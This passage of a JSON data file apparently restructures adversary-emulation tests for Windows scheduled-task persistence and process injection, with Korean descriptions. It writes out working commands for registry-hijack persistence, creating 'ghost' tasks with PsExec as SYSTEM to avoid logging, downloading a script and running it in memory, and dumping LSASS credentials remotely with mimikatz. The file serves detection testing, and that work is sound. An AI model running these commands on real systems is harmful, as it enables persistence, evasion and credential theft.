          "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\r\n$Trigger = New-ScheduledTaskTrigger -AtLogon\r\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\r\n$Set = New-ScheduledTaskSettingsSet\r\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\r\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\r\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\r\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction"
        }
      ],

      "prerequisites": [
        "PowerShell 작업 스케줄러 cmdlet 및 Set-ScheduledTask 지원 버전이어야 한다.",
        "AtomicTaskModifed 작업을 생성·수정할 수 있는 권한(일반적으로 관리자 또는 해당 작업 소유자 권한)이 필요하다.",
        "cmd.exe 및 notepad.exe 실행 파일이 존재해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\AtomicTaskModifed",
            "description": "초기 cmd.exe 액션으로 생성되었다가 이후 notepad.exe 액션으로 수정된 작업의 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "New-ScheduledTask* 및 Set-ScheduledTask를 실행해 작업 생성 및 액션 변경을 수행하는 프로세스",
            "commandline_pattern": "powershell.exe *Register-ScheduledTask AtomicTaskModifed*Set-ScheduledTask \"AtomicTaskModifed\"*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false 명령으로 작업을 삭제한다.",
        "Task Scheduler Operational 로그에서 작업 생성 및 수정 이벤트(예: 106, 140 등)를 분석해 탐지 규칙 설계에 활용할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d"
      }
    },

    {
      "test_id": "T1053.005-10",
      "name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
      "platforms": ["windows"],

      "summary": "PsExec를 사용해 NT AUTHORITY\\SYSTEM 권한 cmd를 연 뒤, GhostTask.exe로 Schedule\\TaskCache\\Tree 하위 레지스트리를 직접 조작해 작업을 생성한다. 이 방식은 일반적인 4698 이벤트 없이 작업을 만들 수 있어 \"Ghost Task\"로 불린다.",

      "procedure": [
        "PathToAtomicsFolder..\\ExternalPayloads\\PsExec.exe와 GhostTask.exe가 존재하는지 확인하고, 없으면 get_prereq 명령으로 다운로드 및 복사한다.",
        "관리자 권한 cmd.exe에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\" 명령을 실행해 #{target} 시스템에서 SYSTEM 권한 cmd 세션을 연다.",
        "SYSTEM 세션에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon 명령을 실행해 로그온 시 cmd /c #{task_command}를 실행하는 작업을 추가한다.",
        "스케줄러 GUI 또는 TaskCache 레지스트리를 통해 #{task_name} 작업이 존재하는지 확인하되, 일반 4698 이벤트가 생성되지 않는 점을 관찰한다.",
        "사용자 로그온 시 notepad.exe 등의 페이로드가 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\r\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon"
        }
      ],

      "prerequisites": [
        "PsExec.exe와 GhostTask.exe가 PathToAtomicsFolder\\..\\ExternalPayloads\\ 경로에 존재해야 한다(없으면 get_prereq로 다운로드).",
        "원격 시스템 #{target}에 대해 PsExec를 사용해 SYSTEM 세션을 열 수 있어야 한다.",
        "Defender 등 보안 제품이 GhostTask.exe를 격리할 수 있으므로, 필요 시 예외 등록 또는 실험용 우회 설정이 필요하다.",
        "레지스트리 Schedule\\TaskCache를 조작할 수 있는 SYSTEM 권한이 필요하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
            "description": "Sysinternals PsExec 유틸리티 실행 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe",
            "description": "GhostTask 유틸리티 실행 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\#{task_name}",
            "description": "GhostTask가 직접 추가한 스케줄 작업 레지스트리 항목(일반적인 태스크 생성 이벤트 없이 존재할 수 있음)"
          }
        ],
        "processes": [
          {
            "name": "PsExec.exe",
            "description": "원격 시스템 #{target}에서 SYSTEM 권한 cmd 세션을 여는 Sysinternals 도구",
            "commandline_pattern": "PsExec.exe \\\\#{target} -accepteula -s cmd.exe"
          },
          {
            "name": "GhostTask.exe",
            "description": "레지스트리 조작을 통해 스케줄 작업을 추가/삭제하는 유틸리티",
            "commandline_pattern": "GhostTask.exe \\\\#{target} add #{task_name} *"
          }
        ],
        "network": [
          {
            "protocol": "SMB/RPC",
            "description": "PsExec가 \\#{target}에 SYSTEM 세션을 생성할 때 사용하는 관리 트래픽",
            "destination_pattern": "#{target}"
          }
        ]
      },

      "cleanup": [
        "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\" 명령으로 다시 SYSTEM 세션을 연다.",
        "\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} 명령으로 #{task_name} 작업을 레지스트리에서 제거한다.",
        "필요 시 ExternalPayloads 폴더 내 PsExec.exe 및 GhostTask.exe를 삭제해 도구 흔적을 지울 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "704333ca-cc12-4bcf-9916-101844881f54"
      }
    },

    {
      "test_id": "T1053.005-11",
      "name": "Scheduled Task Persistence via CompMgmt.msc",
      "platforms": ["windows"],

      "summary": "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command의 기본값을 오버라이드해, compmgmt.msc(컴퓨터 관리 콘솔)가 열릴 때 calc.exe를 대신 실행하도록 한 뒤, compmgmt.msc를 ONLOGON 작업으로 등록한다. 합법적인 MMC 스냅인 실행 경로를 하이재킹하는 스케줄 작업 기반 지속성 기법이다.",

      "procedure": [
        "관리자 권한 cmd.exe를 실행한다.",
        "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f 명령으로 .msc 파일의 기본 open 명령을 #{payload}(기본 calc.exe)로 설정한다.",
        "schtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F 명령을 실행해 로그온 시 compmgmt.msc를 실행하는 스케줄 작업을 생성한다.",
        "ECHO 메시지 이후 compmgmt.msc를 실행하면, 레지스트리 하이재킹에 의해 컴퓨터 관리 콘솔 대신 calc.exe가 실행되는지 확인한다.",
        "사용자 로그온 시에도 동일 동작이 발생해 지속성이 유지되는지 관찰한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\r\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\r\nECHO Let's open the Computer Management console now...\r\ncompmgmt.msc"
        }
      ],

      "prerequisites": [
        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command 레지스트리를 수정할 수 있어야 한다.",
        "compmgmt.msc 및 c:\\windows\\System32\\#{payload} 경로가 존재해야 한다.",
        "작업 스케줄러에 ONLOGON 작업을 생성할 수 있는 권한(일반적으로 관리자 권한)이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\\(Default)",
            "description": ".msc 파일을 열 때 실행될 명령을 오버라이드하는 값(기본: c:\\windows\\System32\\#{payload})"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": ".msc open 동작을 하이재킹하도록 레지스트리 값을 설정하는 도구",
            "commandline_pattern": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" *"
          },
          {
            "name": "schtasks.exe",
            "description": "CompMgmtBypass와 같은 이름으로 ONLOGON 작업을 생성하는 유틸리티",
            "commandline_pattern": "schtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON *"
          },
          {
            "name": "compmgmt.msc",
            "description": "실행 시 실제로는 calc.exe 등 #{payload}가 실행되도록 하이재킹된 MMC 스냅인",
            "commandline_pattern": "compmgmt.msc"
          },
          {
            "name": "calc.exe",
            "description": "레지스트리 하이재킹으로 인해 컴퓨터 관리 콘솔 대신 실행되는 페이로드(기본 값)",
            "commandline_pattern": "c:\\windows\\System32\\calc.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f 명령으로 .msc 파일 핸들러를 원래 상태로 되돌린다.",
        "schtasks /Delete /TN \"#{task_name}\" /F 명령으로 CompMgmtBypass 작업을 삭제한다.",
        "컴퓨터 관리 콘솔(compmgmt.msc)이 다시 정상적으로 열리는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2"
      }
    },

    {
      "test_id": "T1053.005-12",
      "name": "Scheduled Task Persistence via Eventviewer.msc",
      "platforms": ["windows"],

      "summary": "CompMgmt 기법과 동일하게 mscfile 핸들러를 하이재킹하지만, eventvwr.msc를 대상으로 한다. ONLOGON 트리거로 eventvwr.msc를 실행하는 작업을 만들고, .msc 오픈 명령을 calc.exe로 변경해 작업 실행 시 calc.exe가 실행되도록 한다.",

      "procedure": [
        "관리자 권한 cmd.exe에서 reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f 명령을 실행해 .msc 오픈 핸들러를 변경한다.",
        "schtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F 명령을 실행해 로그온 시 이벤트 뷰어 콘솔을 실행하는 스케줄 작업을 생성한다.",
        "ECHO 메시지 후 schtasks /Run /TN \"EventViewerBypass\" 명령으로 방금 생성한 작업을 수동 실행한다.",
        "레지스트리 하이재킹으로 인해 eventvwr.msc 대신 calc.exe(또는 지정한 #{payload})가 실행되는지 확인한다.",
        "이후 실제 사용자 로그온 시에도 동일하게 #{payload}가 실행되어 지속성이 유지되는지 관찰한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\r\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\r\nECHO Let's run the schedule task ...\r\nschtasks /Run /TN \"EventViewerBypass\""
        }
      ],

      "prerequisites": [
        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command 레지스트리를 수정할 수 있어야 한다.",
        "eventvwr.msc 및 지정된 #{payload} 실행 파일이 존재해야 한다.",
        "작업 스케줄러를 통해 ONLOGON 작업을 생성하고 실행할 수 있는 권한이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\\(Default)",
            "description": "eventvwr.msc를 포함한 모든 .msc 실행을 #{payload}로 리디렉션하는 기본 명령 값"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "mscfile 핸들러를 오버라이드해 eventvwr.msc를 하이재킹하는 도구",
            "commandline_pattern": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" *"
          },
          {
            "name": "schtasks.exe",
            "description": "EventViewerBypass와 같은 이름으로 스케줄 작업을 생성·실행하는 유틸리티",
            "commandline_pattern": "schtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON *"
          },
          {
            "name": "eventvwr.msc",
            "description": "스케줄러 작업 및 핸들러 하이재킹의 대상이 되는 이벤트 뷰어 MMC 스냅인",
            "commandline_pattern": "eventvwr.msc"
          },
          {
            "name": "calc.exe",
            "description": "eventvwr.msc 실행 대신 실제로 실행되는 페이로드(기본 값)",
            "commandline_pattern": "c:\\windows\\System32\\calc.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f 명령으로 .msc 기본 핸들러를 복원한다.",
        "schtasks /Delete /TN \"#{task_name}\" /F 명령으로 EventViewerBypass 작업을 삭제한다.",
        "eventvwr.msc가 다시 정상적으로 이벤트 뷰어를 열어주는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "02124c37-767e-4b76-9383-c9fc366d9d4c"
      }
    }
  ]
},
{
  "technique_id": "T1055",
  "technique_name": "Process Injection",
  "tactic": "Defense Evasion",
  "description": "공격자는 다른 프로세스의 메모리에 코드를 삽입하고 그 프로세스의 컨텍스트로 실행시켜 탐지를 회피하고 권한을 상승시키거나, 보안 프로세스를 우회한다. 일반적으로 VirtualAlloc/VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, RtlCreateUserThread, 섹션 매핑, RWX 섹션 악용 등 다양한 API 및 기법이 사용되며, 로컬/원격 프로세스 모두가 대상이 될 수 있다.",

  "tests": [
    {
      "test_id": "T1055-1",
      "name": "Shellcode execution via VBA",
      "platforms": ["windows"],
      "summary": "64비트 MS Word 매크로(VBA)와 Invoke-MalDoc.ps1을 이용해 새 프로세스에 셸코드를 인젝션하고 실행하는 시나리오.",
      "procedure": [
        "PowerShell을 관리자 권한(또는 적절한 권한)으로 실행한다.",
        "사전 조건으로 64비트 Microsoft Word가 설치되어 있는지, 그리고 #{txt_path} 위치에 T1055-macrocode.txt가 존재하는지 확인한다.",
        "다음 명령으로 TLS 1.2를 강제하고 Invoke-MalDoc.ps1을 내려받아 메모리에 로드한다.",
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
        "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)",
        "Invoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\" 명령을 실행해 Word 매크로를 구동한다.",
        "매크로는 지정된 셸코드를 새 프로세스에 인젝션 후 실행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\""
        }
      ],
      "prerequisites": [
        "64비트 버전의 Microsoft Office(Word)가 설치되어 있어야 한다.",
        "\"#{txt_path}\" 경로에 T1055-macrocode.txt 파일이 존재해야 한다(없으면 get_prereq로 다운로드).",
        "인터넷이 가능해야 GitHub에서 스크립트/매크로를 내려받을 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{txt_path}",
            "description": "셸코드 인젝션용 VBA 매크로 코드가 저장된 텍스트 파일"
          }
        ],
        "files_read": [
          {
            "path": "#{txt_path}",
            "description": "Invoke-MalDoc가 로드하여 Word 매크로로 실행하는 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-MalDoc.ps1을 로드하고 매크로 문서를 실행하는 프로세스"
          },
          {
            "name": "WINWORD.EXE",
            "description": "VBA 매크로를 실행하는 64비트 Word 프로세스"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "GitHub에서 Invoke-MalDoc.ps1 및 매크로 파일을 내려받는 트래픽"
          }
        ]
      },
      "cleanup": [
        "테스트용으로 다운로드한 T1055-macrocode.txt 파일을 삭제한다.",
        "필요 시 Word 최근 문서 목록 및 임시 파일을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "1c91e740-1729-4329-b779-feba6e71d048"
      }
    },

    {
      "test_id": "T1055-2",
      "name": "Remote Process Injection in LSASS via mimikatz",
      "platforms": ["windows"],
      "summary": "PsExec를 이용해 원격 시스템의 mimikatz를 실행하고, /inject 옵션으로 LSASS 프로세스에 코드 인젝션 후 RID 500 계정의 크리덴셜을 덤프하는 시나리오.",
      "procedure": [
        "#{mimikatz_path} 위치에 mimikatz.exe가 존재하는지 확인하고, 없으면 Invoke-FetchFromZip를 이용해 최신 릴리스를 다운로드하여 배치한다.",
        "#{psexec_path} 경로에 PsExec.exe가 존재하는지 확인하고, 없으면 PSTools.zip을 내려받아 복사한다.",
        "PsExec를 이용해 원격 호스트 #{machine}에 접속하고 mimikatz를 원격 실행한다.",
        "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\" 명령을 실행한다.",
        "원격 시스템의 LSASS 프로세스에 코드가 인젝션되고, RID 500 계정에 대한 LSA 시크릿/크리덴셜이 덤프된다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\""
        }
      ],
      "prerequisites": [
        "#{mimikatz_path} 위치에 mimikatz.exe가 존재해야 한다(없으면 get_prereq 사용).",
        "#{psexec_path} 위치에 PsExec.exe가 존재해야 한다(없으면 PSTools.zip 다운로드).",
        "로컬 사용자는 원격 시스템 #{machine}에서 관리자/특권 계정이어야 한다.",
        "방화벽에서 PsExec/RPC 관련 포트가 허용되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{mimikatz_path}",
            "description": "다운로드된 mimikatz 실행 파일"
          },
          {
            "path": "#{psexec_path}",
            "description": "다운로드된 PsExec 실행 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "PsExec.exe",
            "description": "원격 시스템에서 mimikatz를 실행하는 Sysinternals 도구"
          },
          {
            "name": "mimikatz.exe",
            "description": "lsadump::lsa /inject /id:500 모듈을 통해 LSASS에 코드 인젝션을 수행"
          }
        ],
        "network": [
          {
            "protocol": "SMB/RPC",
            "description": "PsExec가 \\\\#{machine}에 연결해 mimikatz를 전송 및 실행하는 관리 트래픽"
          }
        ]
      },
      "cleanup": [
        "원격 시스템에서 mimikatz 실행 흔적과 생성된 아웃풋 파일이 있다면 삭제한다.",
        "실험용으로 배치한 PsExec 및 mimikatz 바이너리를 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "3203ad24-168e-4bec-be36-f79b13ef8a83"
      }
    },

    {
      "test_id": "T1055-3",
      "name": "Section View Injection",
      "platforms": ["windows"],
      "summary": "InjectView.exe를 사용해 섹션 오브젝트/뷰를 통해 타겟 프로세스에 셸코드를 매핑하고, 원격 스레드를 생성하는 섹션 뷰 기반 인젝션 테스트.",
      "procedure": [
        "PowerShell에서 $notepad = Start-Process notepad -passthru 명령으로 타겟 프로세스(notepad)를 시작한다.",
        "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\" 명령을 실행한다.",
        "InjectView.exe는 로컬 섹션 오브젝트를 생성하고, 로컬 뷰에 셸코드를 복사한 뒤, notepad 프로세스에 원격 섹션 뷰를 생성해 그 주소를 스레드 시작점으로 사용한다.",
        "메시지 박스/계산기 등 셸코드 동작이 발생하는지 관찰한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$notepad = Start-Process notepad -passthru\r\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\""
        }
      ],
      "prerequisites": [
        "InjectView.exe가 \"$PathToAtomicsFolder\\T1055\\bin\\x64\\\" 경로에 존재해야 한다.",
        "notepad.exe 실행이 차단되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "notepad.exe",
            "description": "셸코드가 인젝션되는 타겟 프로세스"
          },
          {
            "name": "InjectView.exe",
            "description": "섹션 오브젝트/뷰를 이용해 원격 코드 실행을 수행하는 인젝터"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process $notepad.pid 명령으로 notepad 프로세스를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "c6952f41-6cf0-450a-b352-2ca8dae7c178"
      }
    },

    {
      "test_id": "T1055-4",
      "name": "Dirty Vanity process Injection (RtlCreateProcessReflection)",
      "platforms": ["windows"],
      "summary": "calc.exe를 부모 프로세스로 띄운 뒤, redVanity.exe가 RtlCreateProcessReflection을 사용해 포크된 프로세스에 셸코드를 쓰고 실행하는 \"Dirty Vanity\" 프로세스 인젝션.",
      "procedure": [
        "PowerShell에서 #{pid} 기본값(Start-Process calc.exe -PassThru).Id를 통해 부모 프로세스 calc.exe를 시작하고 PID를 얻는다.",
        "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid} 명령을 실행한다.",
        "redVanity.exe는 RtlCreateProcessReflection을 호출해 부모 프로세스를 포크하고, 자식 프로세스 메모리에 셸코드를 기록 후 실행한다.",
        "메시지 박스와 notepad가 열리는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}"
        }
      ],
      "prerequisites": [
        "redVanity.exe가 지정 경로에 존재해야 한다.",
        "calc.exe 실행이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "calc.exe",
            "description": "포크 및 인젝션이 수행되는 부모 프로세스"
          },
          {
            "name": "redVanity.exe",
            "description": "RtlCreateProcessReflection을 사용해 자식 프로세스에 셸코드를 실행하는 인젝터"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force 명령으로 calc 관련 프로세스를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "49543237-25db-497b-90df-d0a0a6e8fe2c"
      }
    },

    {
      "test_id": "T1055-5",
      "name": "Read-Write-Execute (RWX) section Process Injection (MockingJay)",
      "platforms": ["windows"],
      "summary": "RWX 권한 섹션을 가진 취약 DLL(msys-2.0.dll)을 이용하여 VirtualAlloc/WriteProcessMemory 없이 로컬 프로세스 내에서 셸코드를 실행하는 MockingJay 스타일 인젝션.",
      "procedure": [
        "#{vuln_dll} 경로에 msys-2.0.dll이 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다.",
        "PowerShell에서 searchVuln.exe를 실행하여 취약 섹션의 VirtualAddress를 추출한다.",
        "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value",
        "& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address 명령으로 RWX 섹션에 셸코드를 주입하고 스레드를 생성한다.",
        "메시지 박스와 notepad 실행 여부를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\r\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address"
        }
      ],
      "prerequisites": [
        "#{vuln_dll} 경로에 취약 DLL이 존재해야 한다(없으면 get_prereq로 다운로드).",
        "RWXinjectionLocal.exe, searchVuln.exe가 지정 경로에 있어야 한다.",
        "관리자 권한 PowerShell이 요구될 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{vuln_dll}",
            "description": "RWX 섹션을 가진 취약 DLL(msys-2.0.dll)"
          }
        ],
        "files_read": [
          {
            "path": "#{vuln_dll}",
            "description": "searchVuln.exe가 섹션 VirtualAddress를 찾기 위해 분석하는 DLL"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "searchVuln.exe",
            "description": "RWX 섹션의 가상 주소를 찾는 스캐너"
          },
          {
            "name": "RWXinjectionLocal.exe",
            "description": "RWX 섹션에 셸코드를 주입하여 실행하는 인젝터"
          },
          {
            "name": "Notepad.exe",
            "description": "셸코드 실행 결과로 생성되는 예시 프로세스"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 명령으로 notepad를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "0128e48e-8c1a-433a-a11a-a5387384f1e1"
      }
    },

    {
      "test_id": "T1055-6",
      "name": "Process Injection with Go using UuidFromStringA WinAPI",
      "platforms": ["windows"],
      "summary": "UUID 문자열을 UuidFromStringA API로 디코딩하여 힙에 셸코드를 적재하고, EnumSystemLocalesA 콜백을 통해 실행하는 Go 기반 인젝션.",
      "procedure": [
        "PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug 를 실행한다.",
        "프로그램은 UUID 형태로 인코딩된 셸코드를 UuidFromStringA를 통해 바이너리로 변환하고 힙에 저장한다.",
        "EnumSystemLocalesA API를 호출하면서 셸코드가 있는 주소를 콜백으로 사용하여 실행한다.",
        "CalculatorApp(계산기 앱)이 실행되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug"
        }
      ],
      "prerequisites": [
        "UuidFromStringA.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "UuidFromStringA.exe",
            "description": "UUID 문자열을 통해 셸코드를 적재하고 EnumSystemLocalesA로 실행하는 PoC"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 실행 결과로 열리는 계산기 앱"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue 명령으로 계산기를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "2315ce15-38b6-46ac-a3eb-5e21abef2545"
      }
    },

    {
      "test_id": "T1055-7",
      "name": "Process Injection with Go using EtwpCreateEtwThread WinAPI",
      "platforms": ["windows"],
      "summary": "VirtualAlloc/RtlCopyMemory/VirtualProtect로 셸코드를 준비하고, ntdll!EtwpCreateEtwThread를 사용해 현재 프로세스 내에서 셸코드를 실행하는 Go 기반 인젝션.",
      "procedure": [
        "PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug 를 실행한다.",
        "프로그램은 VirtualAlloc로 RW 메모리를 확보하고, RtlCopyMemory로 셸코드를 복사한 뒤 VirtualProtect로 RX로 변경한다.",
        "EtwpCreateEtwThread 함수를 호출해 셸코드 주소를 시작점으로 하는 스레드를 생성한다.",
        "CalculatorApp가 실행되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug"
        }
      ],
      "prerequisites": [
        "EtwpCreateEtwThread.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "EtwpCreateEtwThread.exe",
            "description": "EtwpCreateEtwThread를 이용해 셸코드를 실행하는 인젝터"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 결과로 실행되는 계산기 앱"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue 명령으로 계산기를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "7362ecef-6461-402e-8716-7410e1566400"
      }
    },

    {
      "test_id": "T1055-8",
      "name": "Remote Process Injection with Go using RtlCreateUserThread WinAPI",
      "platforms": ["windows"],
      "summary": "werfault.exe 등 타겟 프로세스를 새로 띄운 후, VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/RtlCreateUserThread 조합으로 원격 프로세스에 셸코드를 인젝션하여 실행.",
      "procedure": [
        "PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작하고 PID를 얻는다.",
